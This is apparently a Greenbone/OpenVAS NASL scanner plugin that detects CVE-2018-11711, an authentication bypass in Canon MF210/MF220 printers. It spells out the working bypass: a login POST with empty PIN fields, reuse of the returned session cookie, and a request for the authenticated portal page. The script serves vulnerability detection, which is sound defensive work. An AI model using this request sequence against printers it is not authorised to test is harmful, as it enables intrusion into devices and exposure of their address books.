if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.813416" );
	script_version( "2021-06-24T11:00:30+0000" );
	script_cve_id( "CVE-2018-11711" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2021-06-24 11:00:30 +0000 (Thu, 24 Jun 2021)" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2018-08-01 12:08:00 +0000 (Wed, 01 Aug 2018)" );
	script_tag( name: "creation_date", value: "2018-06-05 11:37:19 +0530 (Tue, 05 Jun 2018)" );
	script_name( "Canon MF210/MF220 Series Printers Access Bypass Vulnerability" );
	script_copyright( "Copyright (C) 2018 Greenbone Networks GmbH" );
	script_category( ACT_GATHER_INFO );
	script_family( "Web application abuses" );
	script_dependencies( "gb_canon_printers_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "canon_printer/installed", "canon_printer_model" );
	script_xref( name: "URL", value: "https://gist.github.com/huykha/9dbcd0e46058f1e18bab241d1b2754bd" );
	script_tag( name: "summary", value: "This host is running Canon Printer and is
  prone to an access bypass vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted HTTP GET request and check
  whether we are able to bypass access." );
	script_tag( name: "insight", value: "The flaw exists due to insufficient access
  restrictions at any URL of the device that requires authentication." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to bypass the authentication without a PIN at any URL of the device
  that requires authentication." );
	script_tag( name: "affected", value: "Canon printers MF210 and MF220 Series." );
	script_tag( name: "solution", value: "The vendor reportedly responded that this issue occurs when a customer keeps
  the default settings without using the countermeasures and best practices shown in the documentation." );
	script_tag( name: "solution_type", value: "Mitigation" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
cpe_list = make_list( "cpe:/h:canon:mf220_series",
	 "cpe:/h:canon:mf210_series" );
if(!infos = get_app_port_from_list( cpe_list: cpe_list )){
	exit( 0 );
}
CPE = infos["cpe"];
port = infos["port"];
if(!get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
req = http_post_put_req( port: port, url: "/tryLogin.cgi", data: "loginM=&0000=0010&0001=&0002=", add_headers: make_array( "Content-Type", "application/x-www-form-urlencoded" ) );
res = http_keepalive_send_recv( port: port, data: req );
if(IsMatchRegexp( res, "^HTTP/1\\.[01] 303" ) && ContainsString( res, "Location:" ) && ContainsString( res, "Set-Cookie" )){
	cookie = eregmatch( pattern: "Set-Cookie: (fusion-http-session-id=([0-9a-zA-Z]+));", string: res );
	cookie = cookie[1];
}
if(!cookie){
	exit( 0 );
}
req = http_get_req( port: port, url: "/portal_top.html", add_headers: make_array( "Cookie", cookie ) );
res = http_keepalive_send_recv( port: port, data: req );
if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, ">Log Out<" ) && ContainsString( res, ">Copyright CANON INC" ) && ContainsString( res, ">Address Book<" ) && ContainsString( res, ">Cartridge Information<" ) && ContainsString( res, ">Device Status<" )){
	report = http_report_vuln_url( port: port, url: "/portal_top.html" );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

